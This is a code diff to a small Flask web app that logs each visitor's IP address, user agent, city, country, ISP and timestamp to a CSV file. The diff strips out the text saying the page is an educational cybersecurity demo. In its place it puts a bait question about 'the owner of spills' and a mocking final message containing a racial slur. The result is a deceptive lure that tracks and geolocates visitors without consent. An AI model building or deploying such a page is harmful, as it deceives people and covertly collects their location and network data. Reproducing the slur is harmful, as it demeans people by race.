@@ -32,9 +32,8 @@ def get_time():
 @app.route('/spills')
 def consent_page():
     return render_template_string("""
-        <h2>Cybersecurity Demo</h2>
-        <p>This page collects basic device information for educational purposes.</p>
-        <a href="/fool"><button>Continue</button></a>
+        <h2>Want to know about the owner of spills ?</h2>
+        <a href="/fool"><button>Yes</button></a>
     """)
 
 
@@ -64,8 +63,7 @@ def collect_data():
         writer.writerow([ip, user_agent, city, country, isp, timestamp])
 
     return """
-        <h2>Data Collected Successfully</h2>
-        <p>This was part of a cybersecurity awareness demo.</p>
+        <h2>You were fooled nigga !!</h2>
     """
 
 
